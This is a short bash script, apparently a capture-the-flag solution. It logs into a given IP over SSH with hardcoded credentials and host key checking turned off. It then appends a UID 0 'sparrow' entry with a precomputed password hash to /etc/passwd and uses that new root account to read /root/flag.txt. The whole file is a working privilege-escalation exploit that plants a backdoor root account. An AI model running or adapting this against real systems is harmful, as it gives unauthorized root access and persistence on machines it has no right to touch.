#!/bin/bash

port="${2:-2022}"

# Precomputed password hash for "sparrow".
hash='$6$d3PyMB0M$KMrLIrQ8lMnmxZRd2qEVdStQUjvDRFiKYvlH1.jhdqIJe.a2caa6zymb5RjbS0cvs0J0eOyJ1ZK4rBQfdbMqk0'
passwd="sparrow:${hash}:0:0:Sparrow:/root:/bin/bash"
echo "Generated password: $passwd"

if [ -z "$1" ]
then
    echo "No IP supplied. Please provide the target IP address!"
else
    sshpass -pYvFWPeC7sTWJdaYQ ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null jack@$1 -p "$port" "echo '$passwd' >> /etc/passwd && echo sparrow | su -c 'cat /root/flag.txt' sparrow"
fi